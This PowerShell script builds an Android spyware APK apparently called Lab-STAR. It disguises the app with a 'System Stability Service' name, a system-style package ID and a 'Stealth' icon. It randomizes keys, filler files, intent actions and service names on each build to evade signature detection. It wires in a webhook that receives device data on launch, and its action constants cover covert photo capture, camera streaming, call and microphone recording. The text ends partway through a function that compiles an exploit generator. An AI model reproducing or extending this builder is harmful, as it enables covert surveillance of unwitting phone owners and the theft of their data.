#################################################
#          Lab-STAR APK BUILDER - PowerShell      #
#                   v1.5.0 Hardened              #
#                                               #
#  Developed by: Lab-STAR.LABS         #
#  GitHub: https://github.com/K4N3CO/Lab-STAR
#################################################

$ErrorActionPreference = "Continue"

# Script paths
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir
$ConfigFile = Join-Path $ScriptDir "build_config.txt"
$DefaultLogo = Join-Path $ProjectDir "assets\app_logo.png"
$CovertLogo = Join-Path $ProjectDir "assets\default_app_icon.png"

# Default settings
$DefaultSettings = @{
    KeyAlias = "lab-rats-key"
    KeystorePass = "lab-rats123"
    AppName = "System Stability Service"
    VersionName = "2.0"
    VersionCode = 20
}

function Write-Banner {
    Clear-Host
    Write-Host " ┌──────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
    Write-Host " │                                                              │" -ForegroundColor Cyan
    Write-Host " │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │" -ForegroundColor Cyan
    Write-Host " │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │" -ForegroundColor Cyan
    Write-Host " │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │" -ForegroundColor Cyan
    Write-Host " │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │" -ForegroundColor Cyan
    Write-Host " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │" -ForegroundColor Cyan
    Write-Host " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │" -ForegroundColor Cyan
    Write-Host " │                                                              │" -ForegroundColor Cyan
    Write-Host " │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │" -ForegroundColor Cyan
    Write-Host " │ GIT_UPLINK: https://github.com/K4N3CO/Lab-STAR           │" -ForegroundColor Cyan
    Write-Host " │                                                              │" -ForegroundColor Cyan
    Write-Host " └──────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
    Write-Host ""
}

function Load-Config {
    if (Test-Path $ConfigFile) {
        $config = @{}
        Get-Content $ConfigFile | ForEach-Object {
            if ($_ -match "(.+)=(.*)") {
                $key = $matches[1].Trim()
                $value = $matches[2].Trim()
                # Remove quotes if present
                $value = $value -replace '^"|"$', ''
                $config[$key] = $value
            }
        }
        return $config
    }
    return @{}
}

function Save-Config {
    param($config)
    $lines = @()
    foreach ($key in $config.Keys) {
        $lines += "$key=`"$($config[$key])`""
    }
    $lines | Set-Content $ConfigFile
}

function Test-Requirements {
    Write-Host "[*] Checking requirements..." -ForegroundColor Cyan
    Write-Host ""
    
    # Check Java
    $javaExists = Get-Command java -ErrorAction SilentlyContinue
    
    if (-not $javaExists) {
        Write-Host "[!] Java is not installed." -ForegroundColor Red
        Write-Host ""
        Write-Host "[>] Options:" -ForegroundColor Magenta
        Write-Host "    1. Auto-install Java (using winget/chocolatey)"
        Write-Host "    2. Show manual installation instructions"
        Write-Host "    3. Skip (I will install later)"
        Write-Host ""
        
        $option = Read-Host "    Choose option (Default 1)"
        if ([string]::IsNullOrEmpty($option)) { $option = "1" }
        
        switch ($option) {
            "1" { Install-Java }
            "2" { 
                Show-ManualJavaInstall
                Read-Host "Press Enter to continue"
                return $false
            }
            "3" { Write-Host "[!] Skipping Java check. Build may fail." -ForegroundColor Yellow }
        }
    }
    else {
        try {
            $javaVersion = & java -version 2>&1 | Select-String "version" | ForEach-Object { $_.ToString() }
            Write-Host "[OK] Java found: $javaVersion" -ForegroundColor Green
        }
        catch {
            Write-Host "[OK] Java found" -ForegroundColor Green
        }
    }
    
    # Check keytool
    $keytoolExists = Get-Command keytool -ErrorAction SilentlyContinue
    if ($keytoolExists) {
        Write-Host "[OK] keytool found" -ForegroundColor Green
    }
    else {
        Write-Host "[!] keytool not found. Usually comes with JDK." -ForegroundColor Yellow
    }
    
    Write-Host ""
    return $true
}

function Install-Java {
    Write-Host "[*] Attempting to install Java..." -ForegroundColor Cyan
    
    # Try winget first
    $wingetExists = Get-Command winget -ErrorAction SilentlyContinue
    if ($wingetExists) {
        Write-Host "[>] Installing via winget..." -ForegroundColor Yellow
        try {
            & winget install EclipseAdoptium.Temurin.11.JDK --accept-source-agreements --accept-package-agreements
            Write-Host "[OK] Java installed! Please restart PowerShell." -ForegroundColor Green
            return
        }
        catch {
            Write-Host "[!] winget install failed" -ForegroundColor Red
        }
    }
    
    # Try chocolatey
    $chocoExists = Get-Command choco -ErrorAction SilentlyContinue
    if ($chocoExists) {
        Write-Host "[>] Installing via Chocolatey..." -ForegroundColor Yellow
        try {
            & choco install temurin11 -y
            Write-Host "[OK] Java installed! Please restart PowerShell." -ForegroundColor Green
            return
        }
        catch {
            Write-Host "[!] Chocolatey install failed" -ForegroundColor Red
        }
    }
    
    # Open download page
    Write-Host "[!] Auto-install not available. Opening download page..." -ForegroundColor Yellow
    Start-Process "https://adoptium.net/temurin/releases/"
    Write-Host "[!] Please install Java and restart this script." -ForegroundColor Yellow
}

function Show-ManualJavaInstall {
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║              MANUAL JAVA INSTALLATION GUIDE                  ║" -ForegroundColor Cyan
    Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Option 1: Download from Adoptium (Recommended)" -ForegroundColor White
    Write-Host "    1. Go to: https://adoptium.net/temurin/releases/"
    Write-Host "    2. Download JDK 11 or JDK 17 for Windows x64"
    Write-Host "    3. Run the installer (choose Add to PATH)"
    Write-Host "    4. Restart PowerShell and run this script again"
    Write-Host ""
    Write-Host "Option 2: Using winget (Windows 11)" -ForegroundColor White
    Write-Host "    winget install EclipseAdoptium.Temurin.11.JDK"
    Write-Host ""
    Write-Host "Option 3: Using Chocolatey" -ForegroundColor White
    Write-Host "    choco install temurin11"
    Write-Host ""
    Write-Host "Option 4: Using Scoop" -ForegroundColor White
    Write-Host "    scoop bucket add java"
    Write-Host "    scoop install temurin11-jdk"
    Write-Host ""
}

function New-Keystore {
    param([bool]$AutoGenerate = $false)
    
    $keystorePath = Join-Path $ProjectDir "lab-rats-keystore.jks"
    $keystorePropsFile = Join-Path $ProjectDir "keystore.properties"
    
    # Default values
    $keyAlias = $DefaultSettings.KeyAlias
    $keystorePass = $DefaultSettings.KeystorePass
    $cnName = "Lab-STAR Developer"
    $orgName = "Lab-STAR.LABS"
    $country = "US"
    $validityDays = 25 * 365
    
    if (Test-Path $keystorePath) {
        if ($AutoGenerate) {
            Write-Host "[OK] Keystore already exists" -ForegroundColor Green
            return
        }
        Write-Host "[!] Keystore already exists at: $keystorePath" -ForegroundColor Yellow
        $regenerate = Read-Host "    Generate new keystore? (y/N)"
        if ($regenerate -ne "y" -and $regenerate -ne "Y") {
            Write-Host "[OK] Using existing keystore" -ForegroundColor Green
            return
        }
        Remove-Item $keystorePath -Force
    }
    
    if (-not $AutoGenerate) {
        Write-Host "[*] Keystore Configuration" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "[>] Enter keystore details (press Enter for defaults):" -ForegroundColor Magenta
        Write-Host ""
        
        $input = Read-Host "    Key alias [$keyAlias]"
        if (-not [string]::IsNullOrEmpty($input)) { $keyAlias = $input }
        
        $input = Read-Host "    Keystore password [$keystorePass]"
        if (-not [string]::IsNullOrEmpty($input)) { $keystorePass = $input }
        
        $input = Read-Host "    Your name [$cnName]"
        if (-not [string]::IsNullOrEmpty($input)) { $cnName = $input }
        
        $input = Read-Host "    Organization [$orgName]"
        if (-not [string]::IsNullOrEmpty($input)) { $orgName = $input }
        
        $input = Read-Host "    Country code [$country]"
        if (-not [string]::IsNullOrEmpty($input)) { $country = $input }
    }
    else {
        Write-Host "[*] Auto-generating keystore with default values..." -ForegroundColor Cyan
    }
    
    Write-Host ""
    Write-Host "[*] Generating keystore..." -ForegroundColor Cyan
    
    $dname = "CN=$cnName, O=$orgName, C=$country"
    
    try {
        & keytool -genkeypair -alias $keyAlias -keyalg RSA -keysize 2048 `
            -validity $validityDays -keystore $keystorePath `
            -storepass $keystorePass -keypass $keystorePass -dname $dname 2>$null
        
        Write-Host "[OK] Keystore generated successfully!" -ForegroundColor Green
        Write-Host ""
        
        # Create keystore.properties for Gradle (ASCII encoding to avoid BOM issues)
        $keystorePropsContent = "storeFile=lab-rats-keystore.jks`nstorePassword=$keystorePass`nkeyAlias=$keyAlias`nkeyPassword=$keystorePass"
        Set-Content -Path $keystorePropsFile -Value $keystorePropsContent -Encoding Ascii
        Write-Host "[OK] Created keystore.properties for Gradle" -ForegroundColor Green
        
        # Save config
        $config = Load-Config
        $config["KEYSTORE_PATH"] = $keystorePath
        $config["KEY_ALIAS"] = $keyAlias
        $config["KEYSTORE_PASS"] = $keystorePass
        Save-Config $config
        
        if (-not $AutoGenerate) {
            # Show fingerprint
            Write-Host "[*] Certificate SHA-256 fingerprint:" -ForegroundColor Cyan
            & keytool -list -v -keystore $keystorePath -storepass $keystorePass -alias $keyAlias 2>$null | Select-String "SHA256:"
        }
        Write-Host ""
    }
    catch {
        Write-Host "[!] Failed to generate keystore: $_" -ForegroundColor Red
    }
}

function Set-Logo {
    Write-Host "[*] Logo Configuration" -ForegroundColor Cyan
    Write-Host ""
    
    $resDir = Join-Path $ProjectDir "app\src\main\res"
    
    Write-Host "[>] Logo options:" -ForegroundColor Magenta
    Write-Host "    1. Use Recommended System-Style Stealth logo (default_app_icon.png)"
    Write-Host "    2. Use default Lab-STAR logo (app_logo.png)"
    Write-Host "    3. Use custom logo (provide image path)"
    Write-Host "    4. Skip (Keep project icons as is)"
    Write-Host ""
    
    $logoOption = Read-Host "    Choose option (Default 1)"
    if ([string]::IsNullOrEmpty($logoOption)) { $logoOption = "1" }
    
    $logoPath = $null
    
    switch ($logoOption) {
        "1" {
            if (Test-Path $CovertLogo) {
                $logoPath = $CovertLogo
                Write-Host "[OK] Using System-Style Stealth logo" -ForegroundColor Green
            }
            else {
                Write-Host "[!] Stealth logo not found at: $CovertLogo" -ForegroundColor Red
                return
            }
        }
        "2" {
            if (Test-Path $DefaultLogo) {
                $logoPath = $DefaultLogo
                Write-Host "[OK] Using default Lab-STAR logo" -ForegroundColor Green
            }
            else {
                Write-Host "[!] Default logo not found at: $DefaultLogo" -ForegroundColor Red
                return
            }
        }
        "3" {
            $customLogo = Read-Host "    Enter path to logo image (PNG, 512x512)"
            if (Test-Path $customLogo) {
                $logoPath = $customLogo
            }
            else {
                Write-Host "[!] Logo file not found: $customLogo" -ForegroundColor Red
                return
            }
        }
        "4" {
            Write-Host "[OK] No changes made to icons" -ForegroundColor Green
            return
        }
    }
    
    if ($logoPath) {
        Write-Host ""
        $makeTransparent = Read-Host "    Make background transparent (removes white)? (y/N)"
        $doTransparent = ($makeTransparent -eq "y" -or $makeTransparent -eq "Y")
        
        Write-Host "[*] Processing logo..." -ForegroundColor Cyan
        
        # KEY FIX: Remove launcher XMLs from anydpi to ensure PNGs are used
        $adaptiveIconDir = Join-Path $resDir "mipmap-anydpi-v26"
        if (Test-Path $adaptiveIconDir) {
            Remove-Item -Path (Join-Path $adaptiveIconDir "ic_launcher.xml") -Force -ErrorAction SilentlyContinue
            Remove-Item -Path (Join-Path $adaptiveIconDir "ic_launcher_round.xml") -Force -ErrorAction SilentlyContinue
            Write-Host "[*] Optimized adaptive icon config for custom branding" -ForegroundColor Yellow
        }
        
        # Load System.Drawing
        Add-Type -AssemblyName System.Drawing
        
        $densities = @{
            "mipmap-mdpi" = 48
            "mipmap-hdpi" = 72
            "mipmap-xhdpi" = 96
            "mipmap-xxhdpi" = 144
            "mipmap-xxxhdpi" = 192
        }
        
        try {
            $srcImage = [System.Drawing.Bitmap]::FromFile($logoPath)

            foreach ($density in $densities.Keys) {
                $size = $densities[$density]
                $destPath = Join-Path $resDir "$density\ic_launcher.png"
                $destPathRound = Join-Path $resDir "$density\ic_launcher_round.png"
                
                # Check dir exists
                $destDirPath = Join-Path $resDir $density
                if (-not (Test-Path $destDirPath)) {
                    New-Item -ItemType Directory -Path $destDirPath | Out-Null
                }
                
                # Create resized bitmap
                try {
                   $newImage = New-Object System.Drawing.Bitmap($size, $size)
                   $graphics = [System.Drawing.Graphics]::FromImage($newImage)
                   $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                   $graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
                   $graphics.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
                   $graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality

                   # Draw resized (125% Zoom for Stealth Icon)
                   if ($logoOption -eq "1") {
                       $zoom = 1.25 # 125% Scale (Zoom In)
                       $offset = ($size * ($zoom - 1)) / 2
                       $graphics.DrawImage($srcImage, -$offset, -$offset, $size * $zoom, $size * $zoom)
                   } else {
                       $graphics.DrawImage($srcImage, 0, 0, $size, $size)
                   }
                   
                   # Apply transparency if requested (Simple white replacement)
                   if ($doTransparent) {
                       $newImage.MakeTransparent([System.Drawing.Color]::White)
                   }
                   
                   # Save
                   $newImage.Save($destPath, [System.Drawing.Imaging.ImageFormat]::Png)
                   $newImage.Save($destPathRound, [System.Drawing.Imaging.ImageFormat]::Png)
                }
                finally {
                    if ($graphics) { $graphics.Dispose() }
                    if ($newImage) { $newImage.Dispose() }
                }
            }
            
            $srcImage.Dispose()
            Write-Host "[OK] Logo processed, resized, and saved to all densities" -ForegroundColor Green
            if ($doTransparent) {
                Write-Host "[OK] Applied transparency (White -> Transparent)" -ForegroundColor Green
            }
        }
        catch {
            Write-Host "[!] Error processing image: $_" -ForegroundColor Red
            Write-Host "[*] Falling back to simple copy..." -ForegroundColor Yellow
            
            foreach ($density in $densities.Keys) {
                $destPath = Join-Path $resDir "$density\ic_launcher.png"
                Copy-Item $logoPath $destPath -Force
                $destPathRound = Join-Path $resDir "$density\ic_launcher_round.png"
                Copy-Item $logoPath $destPathRound -Force
            }
             Write-Host "[OK] Logo copied (No resizing/transparency applied due to error)" -ForegroundColor Yellow
        }
    }
    Write-Host ""
}

function Set-AppConfig {
    Write-Host "[*] App Configuration" -ForegroundColor Cyan
    Write-Host ""
    
    $stringsFile = Join-Path $ProjectDir "app\src\main\res\values\strings.xml"
    $buildGradle = Join-Path $ProjectDir "app\build.gradle"
    
    # Load config
    $config = Load-Config
    
    # Generate random defaults
    $randomMajor = Get-Random -Minimum 1 -Maximum 10
    $randomMinor = Get-Random -Minimum 0 -Maximum 9
    $randomPatch = Get-Random -Minimum 0 -Maximum 9
    $randVerName = "$randomMajor.$randomMinor.$randomPatch"
    $randVerCode = Get-Random -Minimum 10 -Maximum 1000
    
    # Package Name (Application ID)
    $currentPkg = "com.android.system.stability" # Fallback
    if (Test-Path $buildGradle) {
        $gradleContent = Get-Content $buildGradle -Raw
        if ($gradleContent -match 'applicationId\s+"([^"]+)"') {
            $currentPkg = $matches[1]
        }
    }
    
    $pkgName = Read-Host "    Enter Package Name (Application ID) [$currentPkg]"
    if ([string]::IsNullOrEmpty($pkgName)) { $pkgName = $currentPkg }
    
    # App name
    $currentAppName = "System Stability Service"
    if (Test-Path $stringsFile) {
        $stringsContent = Get-Content $stringsFile -Raw
        if ($stringsContent -match '<string name="app_name">([^<]+)</string>') {
            $currentAppName = $matches[1]
        }
    }
    
    $appName = Read-Host "    Enter App Name [$currentAppName]"
    if ([string]::IsNullOrEmpty($appName)) { $appName = $currentAppName }
    
    # Min SDK
    $currentMinSdk = "21"
    if (Test-Path $buildGradle) {
        if ($gradleContent -match 'minSdk\s+(\d+)') {
            $currentMinSdk = $matches[1]
        }
    }
    
    $minSdk = Read-Host "    Enter Min SDK [$currentMinSdk]"
    if ([string]::IsNullOrEmpty($minSdk)) { $minSdk = $currentMinSdk }

    # Version Name
    $versionName = Read-Host "    Enter Version Name (Random: $randVerName) [$randVerName]"
    if ([string]::IsNullOrEmpty($versionName)) { $versionName = $randVerName }
    
    # Version Code
    $versionCode = Read-Host "    Enter Version Code (Random: $randVerCode) [$randVerCode]"
    if ([string]::IsNullOrEmpty($versionCode)) { $versionCode = $randVerCode }
    
    # Apply changes to build.gradle
    if (Test-Path $buildGradle) {
        $content = Get-Content $buildGradle -Raw
        $content = $content -replace 'applicationId\s+"[^"]+"', "applicationId `"$pkgName`""
        $content = $content -replace 'minSdk\s+\d+', "minSdk $minSdk"
        $content = $content -replace 'versionCode \d+', "versionCode $versionCode"
        $content = $content -replace 'versionName ".*?"', "versionName `"$versionName`""
        Set-Content $buildGradle $content
        Write-Host "[OK] build.gradle updated (Pkg: $pkgName, MinSdk: $minSdk, Ver: $versionName)" -ForegroundColor Green
    }
    
    # Apply changes to strings.xml
    if (Test-Path $stringsFile) {
        $content = Get-Content $stringsFile -Raw
        $content = $content -replace '<string name="app_name">.*?</string>', "<string name=`"app_name`">$appName</string>"
        Set-Content $stringsFile $content
        Write-Host "[OK] App name set to: $appName" -ForegroundColor Green
    }
    
    $config["APP_NAME"] = $appName
    $config["VERSION_NAME"] = $versionName
    $config["VERSION_CODE"] = $versionCode

    # --- DYNAMIC OBFUSCATION PROTOCOL ---
    Write-Host "[*] Configuring Dynamic Obfuscation..." -ForegroundColor Cyan

    # 1. Generate Dynamic Encryption Key
    $randKey = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})
    $localProps = Join-Path $ProjectDir "local.properties"
    if (Test-Path $localProps) {
        $content = Get-Content $localProps
        if ($content -match 'ENCRYPTION_KEY=') {
            $content -replace 'ENCRYPTION_KEY=.*', "ENCRYPTION_KEY=$randKey" | Set-Content $localProps
        } else {
            Add-Content $localProps "`nENCRYPTION_KEY=$randKey"
        }
    } else {
        Set-Content $localProps "ENCRYPTION_KEY=$randKey"
    }

    # 2. Add Binary Signature Entropy
    $sysDir = Join-Path $ProjectDir "app\src\main\assets\sys"
    if (-not (Test-Path $sysDir)) { New-Item -ItemType Directory -Path $sysDir | Out-Null }
    for ($i=1; $i -le 3; $i++) {
        $data = New-Object Byte[] 512
        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($data)
        [System.IO.File]::WriteAllBytes((Join-Path $sysDir "metadata_$i.dat"), $data)
    }

    # 3. Randomize Intent Actions in Constants.java
    $constantsJava = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\Constants.java"
    $manifest = Join-Path $ProjectDir "app\src\main\AndroidManifest.xml"
    $actPrefix = "com.labs." + (-join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_}))

    $actionFields = @("ACTION_AUTO_START", "ACTION_KEEP_ALIVE", "ACTION_START_STREAM", "ACTION_STOP_STREAM", "ACTION_CAPTURE_PHOTO", "ACTION_START_RECORDING", "ACTION_STOP_RECORDING", "ACTION_STOP_OPTICS", "ACTION_START_CORE", "ACTION_STOP_CORE", "ACTION_START_CALL_REC", "ACTION_STOP_CALL_REC", "ACTION_START_MIC_REC", "ACTION_STOP_MIC_REC", "ACTION_CALL_STATE_CHANGED", "ACTION_UPDATE_AUDIO_SETTINGS", "ACTION_STOP_AUDIO", "ACTION_START_AUDIO")

    if (Test-Path $constantsJava) {
        $javaContent = Get-Content $constantsJava -Raw
        foreach ($field in $actionFields) {
            $randAction = $actPrefix + "." + (-join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_}))
            $javaContent = $javaContent -replace "public static final String $field = `".*?`";", "public static final String $field = `"$randAction`";"

            # Sync special actions with Manifest hardcodings
            if ($field -eq "ACTION_AUTO_START") {
                $manifestContent = Get-Content $manifest -Raw
                $manifestContent = $manifestContent -replace 'com\.labs\.stability\.ST_P_01', $randAction
                Set-Content $manifest $manifestContent
            }
            if ($field -eq "ACTION_KEEP_ALIVE") {
                $manifestContent = Get-Content $manifest -Raw
                $manifestContent = $manifestContent -replace 'com\.labs\.stability\.ST_P_02', $randAction
                Set-Content $manifest $manifestContent
            }
        }
        Set-Content $constantsJava $javaContent
    }

    # 4. Service/Receiver Randomization
    $prefix = -join ((97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_})
    $entities = @("WorkManager_Sync", "Analytics_Provider", "MediaFrameworkService", "StatusNotification", "IO_Persistence_Manager", "TelephonyState", "SystemBoot", "InstallReferrerReceiver")
    $mappingFile = Join-Path $ScriptDir "build_mapping.txt"
    $mapping = @()

    $manifestContent = Get-Content $manifest -Raw
    foreach ($entity in $entities) {
        $randName = $prefix + "_" + (-join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}))
        $mapping += "$entity:$randName"

        # Update Manifest
        $manifestContent = $manifestContent -replace "\.$entity", ".$randName"

        # Update all Java files
        $javaFiles = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "*.java" -Recurse
        foreach ($f in $javaFiles) {
            $c = Get-Content $f.FullName -Raw
            $c = $c -replace "\b$entity\b", $randName
            Set-Content $f.FullName $c
        }

        # Rename the file
        $fileToRename = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "$entity.java" -Recurse
        if ($fileToRename) {
            Rename-Item -Path $fileToRename.FullName -NewName "$randName.java"
        }
    }
    Set-Content $manifest $manifestContent
    $mapping | Set-Content $mappingFile

    # Google Sheet URL
    Write-Host ""
    Write-Host "[>] Google Sheet Webhook Configuration" -ForegroundColor Magenta
    Write-Host "    This URL will receive device data when app starts." -ForegroundColor Yellow
    Write-Host "    You need to set up Google Sheet manually (see README)." -ForegroundColor Yellow
    Write-Host "    Leave empty to skip." -ForegroundColor Yellow
    Write-Host ""
    
    $sheetUrl = Read-Host "    Enter Google Sheet webhook URL"
    
    $localProps = Join-Path $ProjectDir "local.properties"
    if (-not [string]::IsNullOrEmpty($sheetUrl)) {
        $config["SHEET_URL"] = $sheetUrl

        # Update local.properties for Gradle
        if (Test-Path $localProps) {
            $content = Get-Content $localProps
            if ($content -match 'WEBHOOK_URL=') {
                $content -replace 'WEBHOOK_URL=.*', "WEBHOOK_URL=$sheetUrl" | Set-Content $localProps
            } else {
                Add-Content $localProps "`nWEBHOOK_URL=$sheetUrl"
            }
        } else {
            Set-Content $localProps "WEBHOOK_URL=$sheetUrl"
        }

        Write-Host "[OK] Google Sheet URL saved to config and local.properties" -ForegroundColor Green
    }
    else {
        Write-Host "[!] Skipping Google Sheet configuration" -ForegroundColor Yellow
    }
    
    # Save config
    Save-Config $config
    
    Write-Host ""
}

function Execute-BuildWithProgress {
    param(
        [string]$Task,
        [string]$Label,
        [int]$Seconds
    )

    Write-Host "    [*] $Label..." -ForegroundColor Cyan -NoNewline

    # Start Gradle in background
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "cmd.exe"
    $processInfo.Arguments = "/c .\gradlew.bat $Task --no-daemon > build_log.txt 2>&1"
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true

    $process = [System.Diagnostics.Process]::Start($processInfo)

    $steps = 40
    $sleepTime = ($Seconds * 1000) / $steps

    Write-Host "`r    [*] $Label [" -ForegroundColor Cyan -NoNewline
    for ($i = 1; $i -le $steps; $i++) {
        if ($process.HasExited) {
            # Build finished early - snap to 100%
            for ($j = $i; $j -le $steps; $j++) { Write-Host "█" -NoNewline -ForegroundColor Cyan }
            Write-Host "] 100% " -NoNewline -ForegroundColor Cyan
            Write-Host "[DONE]" -ForegroundColor Green
            return $process.ExitCode
        }

        # If we reach 95% and process is still running, go to Finalizing mode
        if ($i -eq 38) {
            Write-Host "█" -NoNewline -ForegroundColor Cyan
            Write-Host "] 95% " -NoNewline -ForegroundColor Cyan
            Write-Host "[FINALIZING...]" -ForegroundColor Yellow -NoNewline
            while (-not $process.HasExited) {
                Start-Sleep -Milliseconds 100
            }
            Write-Host "`r    [*] $Label [" -ForegroundColor Cyan -NoNewline
            for ($j = 1; $j -le $steps; $j++) { Write-Host "█" -NoNewline -ForegroundColor Cyan }
            Write-Host "] 100% " -NoNewline -ForegroundColor Cyan
            Write-Host "[DONE]" -ForegroundColor Green
            return $process.ExitCode
        }

        Write-Host "█" -NoNewline -ForegroundColor Cyan
        $percent = [math]::Floor(($i / $steps) * 100)

        Start-Sleep -Milliseconds $sleepTime
    }

    while (-not $process.HasExited) {
        Start-Sleep -Seconds 1
    }

    Write-Host "] 100% " -NoNewline -ForegroundColor Cyan
    Write-Host "[DONE]" -ForegroundColor Green
    return $process.ExitCode
}

function Build-Apk {
    Write-Banner
    Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan
    Write-Host ""
    
    $currentDir = Get-Location
    Set-Location $ProjectDir
    
    # Load config
    $config = Load-Config
    
    # Check if keystore exists - auto-generate if not
    $keystoreFile = Join-Path $ProjectDir "lab-rats-keystore.jks"
    if (-not (Test-Path $keystoreFile)) {
        Write-Host "[!] No keystore found. Auto-generating..." -ForegroundColor Yellow
        New-Keystore -AutoGenerate $true
        Write-Host ""
    }
    
    # Create output folder
    $outputDir = Join-Path $ScriptDir "output"
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir | Out-Null
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $appName = if ($config["APP_NAME"]) { $config["APP_NAME"] -replace ' ', '_' } else { "System_Stability_Service" }
    $versionName = if ($config["VERSION_NAME"]) { $config["VERSION_NAME"] } else { "2.0" }
    $apkFound = $false

    # ---------------------------------------------------------
    # 1. Build Signed APK
    # ---------------------------------------------------------
    Write-Host "[1/2] Generating Signed Production APK" -ForegroundColor Blue
    $exitCode = Execute-BuildWithProgress -Task "clean assembleRelease" -Label "Compiling Resources & Signing" -Seconds 15

    $releaseDir = Join-Path $ProjectDir "app\build\outputs\apk\release"
    $releaseApk = Join-Path $releaseDir "app-release.apk"

    if (Test-Path $releaseApk) {
        $outputSigned = Join-Path $outputDir "$appName-v$versionName-signed.apk"
        Copy-Item $releaseApk $outputSigned -Force
        Write-Host "    [✓] Saved: $(Split-Path $outputSigned -Leaf)" -ForegroundColor Green
        $apkFound = $true
    } else {
        Write-Host "    [!] Signed APK generation failed. See build_log.txt" -ForegroundColor Red
    }

    Write-Host ""

    # ---------------------------------------------------------
    # 2. Build Unsigned APK
    # ---------------------------------------------------------
    Write-Host "[2/2] Generating Unsigned Debug APK" -ForegroundColor Blue
    $exitCode = Execute-BuildWithProgress -Task "assembleRelease -PdisableSigning" -Label "Packaging Assets" -Seconds 10

    $unsignedApk = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release-unsigned.apk"
    if (-not (Test-Path $unsignedApk)) {
         $fallback = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release.apk"
         if (Test-Path $fallback) { $unsignedApk = $fallback }
    }

    if (Test-Path $unsignedApk) {
        $outputUnsigned = Join-Path $outputDir "$appName-v$versionName-unsigned.apk"
        Copy-Item $unsignedApk $outputUnsigned -Force
        Write-Host "    [✓] Saved: $(Split-Path $outputUnsigned -Leaf)" -ForegroundColor Green
        $apkFound = $true
    } else {
        Write-Host "    [!] Unsigned APK generation failed. See build_log.txt" -ForegroundColor Red
    }

    # Revert obfuscation mapping to restore source for next build or editing
    $mappingFile = Join-Path $ScriptDir "build_mapping.txt"
    if (Test-Path $mappingFile) {
        Write-Host "[*] Restoring source tree..." -ForegroundColor Cyan
        $manifest = Join-Path $ProjectDir "app\src\main\AndroidManifest.xml"
        $mapping = Get-Content $mappingFile

        foreach ($line in $mapping) {
            if ($line -match "(.+):(.+)") {
                $entity = $matches[1]
                $rand = $matches[2]

                # Update Manifest
                $manifestContent = Get-Content $manifest -Raw
                $manifestContent = $manifestContent -replace "\.$rand", ".$entity"
                Set-Content $manifest $manifestContent

                # Update all Java files
                $javaFiles = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "*.java" -Recurse
                foreach ($f in $javaFiles) {
                    $c = Get-Content $f.FullName -Raw
                    $c = $c -replace "\b$rand\b", $entity
                    Set-Content $f.FullName $c
                }

                # Rename the file back
                $fileToRename = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "$rand.java" -Recurse
                if ($fileToRename) {
                    Rename-Item -Path $fileToRename.FullName -NewName "$entity.java"
                }
            }
        }
        Remove-Item $mappingFile -Force
    }
    
    if ($apkFound) {
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║                    BUILD SUCCESSFUL!                         ║" -ForegroundColor Green
        Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
        Write-Host "[✓] APKs saved to: $outputDir" -ForegroundColor Green
        Write-Host ""
    }
    else {
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
        Write-Host "║                      BUILD FAILED!                           ║" -ForegroundColor Red
        Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
        Write-Host ""
        Write-Host "[!] No APK files found. Check errors in build_log.txt" -ForegroundColor Red
    }
    Set-Location $currentDir
}

function New-ExploitStandalone {
    param($Type, $Url, $Extra)

    $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
    $tempBin = Join-Path $ScriptDir "bin"
    if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }

    Write-Host "[*] Compiling Exploit Generator..." -ForegroundColor Cyan
    $javacArgs = "-sourcepath", (Join-Path $ProjectDir "app\src\main\java"), "-d", $tempBin, $exploitSrc
    & javac $javacArgs 2> build_log.txt

    if ($LASTEXITCODE -eq 0) {
